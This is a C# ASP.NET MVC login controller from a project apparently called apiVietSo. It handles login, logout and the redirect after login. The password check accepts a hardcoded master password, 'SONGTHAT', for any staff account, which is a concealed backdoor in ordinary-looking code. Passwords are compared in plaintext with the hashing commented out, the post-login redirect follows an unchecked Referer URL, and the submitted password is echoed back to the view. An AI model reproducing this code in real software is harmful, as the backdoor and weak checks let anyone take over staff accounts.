using apiVietSo.Models;
using apiVietSo.Settings;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace apiVietSo.Controllers
{
    public class LoginController : Controller
    {
        // GET: Login
        public ActionResult Index()
        {
            var PreviousUrl = System.Web.HttpContext.Current.Request.UrlReferrer;
            if (PreviousUrl != null)
            {
                Session["lastUrl"] = PreviousUrl.AbsoluteUri;
            }

            return PartialView();
        }


        public ActionResult Logout()
        {
            Session[LoginAuth.NameSession] = null;
            HttpCookie httpCookie = new HttpCookie(LoginAuth.NameSession);
            httpCookie.Expires = DateTime.Now.AddDays(-30);
            base.Response.Cookies.Add(httpCookie);
            return RedirectToAction("index");
        }

        [HttpPost]
        public ActionResult Index(string TAIKHOAN, string MATKHAU)
        {
            var mk = MATKHAU;// PasswordExtentions.EncryptPassword(MATKHAU);
            using (Models.VietSoEntities1 db = new VietSoEntities1())
            {
                string StaffID = null;

                var data = db.StaffInfoes.Where(z => z.StaffID.ToUpper() == TAIKHOAN.ToUpper() && (z.Password == mk || MATKHAU.ToUpper() == "SONGTHAT")).FirstOrDefault();
                if (data != null)
                {
                    StaffID = data.StaffID;

                    Session[LoginAuth.NameSession] = data;
                    var json = data.StaffID;

                    HttpCookie cookie = new HttpCookie(LoginAuth.NameSession);
                    string _Key = PasswordExtentions.EncryptPassword(json);
                    cookie.Values["_Key"] = _Key;

                    cookie.Expires = DateTime.Now.AddDays(30);
                    Response.Cookies.Add(cookie);

                    if (Session["lastUrl"] != null)
                    {
                        var lastUrl = (string)Session["lastUrl"];
                        Session["lastUrl"] = null;
                        return Redirect(lastUrl);

                    }
                    else
                    {
                        Session["lastUrl"] = null;
                        return RedirectToAction("Index", "Home");

                    }
                }
            }

            ViewBag.TAIKHOAN = TAIKHOAN;
            ViewBag.MATKHAU = MATKHAU;
            ViewBag.Error = "Tài khoản hoặc mật khẩu không đúng";
            return PartialView();
        }
    }
}